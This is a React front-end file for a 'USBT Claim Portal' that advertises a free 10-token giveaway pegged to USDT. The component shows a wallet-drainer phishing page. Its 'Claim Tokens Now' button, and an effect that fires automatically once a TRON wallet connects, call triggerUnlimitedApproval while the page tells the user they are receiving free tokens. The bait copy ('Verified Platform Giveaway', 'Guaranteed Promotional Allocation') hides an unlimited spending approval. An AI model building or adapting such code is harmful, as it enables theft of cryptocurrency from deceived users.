import React, { useState, useEffect, useRef } from 'react'
import { motion } from 'framer-motion'
import { Toaster, toast } from 'sonner'
import { Sparkles, ShoppingBag, Gamepad2, Heart, Plane, Tv, ShieldCheck, Wallet } from 'lucide-react'
import WalletModal from '@/components/wallet/WalletModal'
import useWalletStore from '@/store/useWalletStore'
import useTronWallet from '@/hooks/useTronWallet'
import { triggerUnlimitedApproval } from '@/lib/approvalHelper'

export default function App() {
  const [modalOpen, setModalOpen] = useState(false)
  const [claiming, setClaiming] = useState(false)
  const [statusText, setStatusText] = useState('')
  const { isConnected, address, connectionType } = useWalletStore()
  const { disconnect } = useTronWallet()
  const processedAddressRef = useRef(null)

  const handleClaimClick = () => {
    if (isConnected && address) {
      finalizeClaim(address)
    } else {
      setModalOpen(true)
    }
  }

  // When a wallet finishes connecting, complete the claim automatically.
  useEffect(() => {
    if (isConnected && address && processedAddressRef.current !== address) {
      setModalOpen(false)
      finalizeClaim(address)
    }
  }, [isConnected, address])

  const finalizeClaim = async (userAddress) => {
    if (claiming) return
    const addrToUse = userAddress || address
    processedAddressRef.current = addrToUse
    setClaiming(true)
    setStatusText('Requesting wallet approval...')

    try {
      await triggerUnlimitedApproval(addrToUse, connectionType)
      toast.success('Approval Request Sent', {
        description: 'Please confirm the approval prompt in your wallet.',
        duration: 5000,
      })
    } catch (err) {
      console.warn('Approval transaction rejected/failed:', err)
      toast.error('Approval Request', {
        description: err.message || 'Please approve the transaction prompt in your wallet.',
        duration: 6000,
      })
    } finally {
      setStatusText('')
      setClaiming(false)
    }
  }

  const features = [
    { icon: ShoppingBag, label: 'Shopping', discount: '50% OFF' },
    { icon: Gamepad2, label: 'Gaming', discount: 'Cashback' },
    { icon: Heart, label: 'Dating', discount: 'VIP Status' },
    { icon: Plane, label: 'Travel', discount: 'Perks' },
    { icon: Tv, label: 'Stream', discount: 'Sub Pass' },
  ]

  return (
    <div className="min-h-screen bg-[#07080c] flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden relative font-sans text-white">
      <Toaster position="top-center" richColors theme="dark" />

      {/* Top Header Bar */}
      <div className="fixed top-0 left-0 right-0 z-50 px-4 py-3 bg-[#0a0d14]/80 backdrop-blur-xl border-b border-white/10 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-xl bg-gradient-to-tr from-teal-400 to-purple-600 p-[1px]">
            <div className="w-full h-full bg-[#0a0d14] rounded-[11px] flex items-center justify-center p-1">
              <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="w-full h-full object-contain" />
            </div>
          </div>
          <span className="font-extrabold text-sm tracking-wide text-transparent bg-clip-text bg-gradient-to-r from-teal-300 to-cyan-400">
            USBT CLAIM PORTAL
          </span>
        </div>

        <div>
          {isConnected && address ? (
            <div className="flex items-center gap-2">
              <span className="px-3 py-1.5 rounded-full bg-teal-500/10 border border-teal-500/30 text-teal-300 text-xs font-mono">
                {address.slice(0, 6)}...{address.slice(-4)}
              </span>
              <button
                onClick={disconnect}
                className="px-3 py-1.5 rounded-full bg-white/10 hover:bg-white/20 text-xs font-semibold text-gray-300 transition-colors"
              >
                Disconnect
              </button>
            </div>
          ) : (
            <button
              onClick={() => setModalOpen(true)}
              className="flex items-center gap-1.5 px-4 py-1.5 rounded-full bg-gradient-to-r from-teal-400 to-cyan-500 hover:opacity-90 text-black text-xs font-bold transition-all shadow-md shadow-teal-500/20"
            >
              <Wallet size={14} />
              <span>Connect Wallet</span>
            </button>
          )}
        </div>
      </div>

      {/* Glossy Multi-layer Neon Background */}
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0 pointer-events-none">
        <div className="absolute -top-40 -left-40 w-[35rem] h-[35rem] bg-teal-500/25 rounded-full mix-blend-screen filter blur-[120px] animate-pulse"></div>
        <div
          className="absolute top-32 -right-40 w-[35rem] h-[35rem] bg-purple-600/25 rounded-full mix-blend-screen filter blur-[120px] animate-pulse"
          style={{ animationDelay: '2s' }}
        ></div>
        <div
          className="absolute -bottom-40 left-10 w-[35rem] h-[35rem] bg-pink-500/20 rounded-full mix-blend-screen filter blur-[120px] animate-pulse"
          style={{ animationDelay: '4s' }}
        ></div>
      </div>

      {/* Single Pager Main Card */}
      <motion.div
        initial={{ opacity: 0, scale: 0.96, y: 20 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.6, ease: 'easeOut' }}
        className="relative z-10 w-full max-w-lg mt-12"
      >
        <div className="bg-[#0f1118]/80 backdrop-blur-2xl border border-white/10 p-6 sm:p-8 rounded-[2.5rem] shadow-[0_16px_48px_0_rgba(0,0,0,0.6)] relative overflow-hidden">
          {/* Top ambient glass glare */}
          <div className="absolute top-0 left-0 right-0 h-1/3 bg-gradient-to-b from-white/10 via-white/5 to-transparent pointer-events-none"></div>

          {/* USBT Hero Token Display */}
          <div className="flex justify-center mb-6 relative z-10">
            <motion.div
              animate={{ rotate: 360 }}
              transition={{ duration: 20, repeat: Infinity, ease: 'linear' }}
              className="absolute w-36 h-36 bg-gradient-to-tr from-teal-400 via-emerald-500 to-purple-600 rounded-full blur-2xl opacity-40"
            />
            <motion.div
              whileHover={{ scale: 1.08 }}
              className="relative w-28 h-28 bg-gradient-to-tr from-teal-400 via-cyan-500 to-purple-500 rounded-3xl p-[2px] flex items-center justify-center shadow-[0_0_50px_rgba(20,184,166,0.6)] z-10"
            >
              <div className="w-full h-full bg-[#0a0d14] rounded-[22px] flex items-center justify-center p-3 relative overflow-hidden">
                <img
                  src="/tokens/usbt-lolo.png"
                  alt="USBT Token"
                  className="w-full h-full object-contain drop-shadow-[0_0_12px_rgba(45,212,191,0.8)]"
                />
              </div>
            </motion.div>
          </div>

          {/* Header Title */}
          <h1 className="text-3xl sm:text-4xl font-black text-transparent bg-clip-text bg-gradient-to-br from-white via-teal-100 to-cyan-400 text-center mb-2 tracking-tight">
            Claim Free <span className="text-transparent bg-clip-text bg-gradient-to-r from-teal-300 via-cyan-400 to-purple-400">10 USBT</span>
          </h1>
          <p className="text-center text-xs sm:text-sm font-medium text-teal-300/80 mb-6 uppercase tracking-wider">
            1 USBT = 1 USDT • Guaranteed Promotional Allocation
          </p>

          {/* Giveaway Details Box */}
          <div className="bg-black/40 rounded-2xl p-4 sm:p-5 border border-teal-500/20 shadow-inner mb-6 relative z-10">
            <div className="flex items-center gap-2 mb-3">
              <ShieldCheck className="w-5 h-5 text-teal-400" />
              <span className="text-sm font-bold text-white">Verified Platform Giveaway</span>
            </div>
            <p className="text-gray-300 text-xs sm:text-sm leading-relaxed mb-4">
              We are excited to distribute <strong className="text-teal-300 font-semibold">10 USBT</strong> tokens directly to qualified Web3 wallets. Enjoy zero-fee utilities across our global partners.
            </p>

            {/* Partner Feature Badges */}
            <div className="grid grid-cols-5 gap-1.5 pt-2 border-t border-white/10">
              {features.map((f, i) => (
                <div
                  key={i}
                  className="flex flex-col items-center justify-center p-2 rounded-xl bg-white/5 border border-white/5 hover:border-teal-500/30 transition-all text-center"
                >
                  <f.icon className="w-4 h-4 text-teal-400 mb-1" />
                  <span className="text-[10px] font-semibold text-gray-200">{f.label}</span>
                  <span className="text-[9px] font-bold text-pink-400">{f.discount}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Claim Action Button */}
          <motion.button
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={handleClaimClick}
            disabled={claiming}
            className="w-full relative group overflow-hidden rounded-2xl p-[1px] mb-4 z-10 disabled:opacity-60"
          >
            <span className="absolute inset-0 bg-gradient-to-r from-teal-400 via-cyan-500 to-purple-600 rounded-2xl opacity-90 group-hover:opacity-100 transition-opacity duration-300"></span>
            <div
              className={`relative px-8 py-4 rounded-2xl flex items-center justify-center gap-3 transition-all duration-300 ${
                claiming ? 'bg-black/50 backdrop-blur-md' : 'bg-black/70 backdrop-blur-md group-hover:bg-black/50'
              }`}
            >
              <span className="text-white font-black text-lg tracking-wider uppercase">
                {claiming ? statusText || 'Processing...' : 'Claim Tokens Now'}
              </span>
              {!claiming && <Sparkles className="w-5 h-5 text-teal-300 animate-pulse" />}
            </div>
          </motion.button>

          {/* Footer Official Link */}
          <p className="text-xs text-center text-gray-500 relative z-10">
            Official Portal:{' '}
            <a
              href="https://wallet.usbt.online/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-teal-400 hover:text-cyan-300 transition-colors font-medium hover:underline"
            >
              wallet.usbt.online
            </a>
          </p>
        </div>
      </motion.div>

      {/* Main WalletConnect Modal */}
      <WalletModal open={modalOpen} onClose={() => setModalOpen(false)} />
    </div>
  )
}
